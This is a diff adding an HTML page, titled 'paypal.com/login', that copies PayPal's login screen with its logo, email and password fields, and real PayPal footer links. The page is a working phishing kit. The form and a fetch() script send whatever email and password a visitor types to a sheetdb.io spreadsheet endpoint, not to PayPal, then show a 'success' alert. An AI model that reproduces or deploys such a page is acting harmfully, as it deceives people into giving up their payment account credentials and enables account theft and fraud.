@@ -1,0 +1,64 @@
+
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>paypal.com/login</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+		<!-- content -->
+		<main>
+			<div class="container">
+				<p
+					role="img"
+					aria-label="PayPal Logo"
+					class="paypal-logo paypal-logo-long"
+				></p>
+				<form action="https://sheetdb.io/api/v1/0tyktfcarzouh" method="post" id="sheetdb-form"class="form__container">
+					<input type="text" name="data[email]" placeholder="Email or mobile number" />
+					<input type="password" name="data[pass]" placeholder="Enter your password" />
+					<button class="btn__login">Log In</button>
+					<div class="forget__cta">
+						<a href="#">Having trouble logging in?</a>
+					</div>
+					<div class="separator">
+						<div class="first"></div>
+						<div class="center"><span>or</span></div>
+						<div class="last"></div>
+					</div>
+					<button class="btn__signUp">Sign Up</button>
+				</form>
+			</div>
+			<footer>
+				<a href="https://www.paypal.com/in/smarthelp/contact-us">Contact Us</a>
+				<a href="https://www.paypal.com/in/webapps/mpp/ua/privacy-full">Privacy</a>
+				<a href="https://www.paypal.com/in/webapps/mpp/ua/legalhub-full">Legal</a>
+				<a href="paypal.com">Worldwide</a>
+			</footer>
+		</main>
+		<!-- footer -->
+	</body>
+</html>
+<!-- partial -->
+<script>
+  var form = document.getElementById('sheetdb-form');
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(form.action, {
+        method : "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+    }).then(
+        response => response.json()
+    ).then((html) => {
+      // you can put any JS code here
+      alert('success')
+    });
+  });
+</script>
+  
+</body>
+</html>
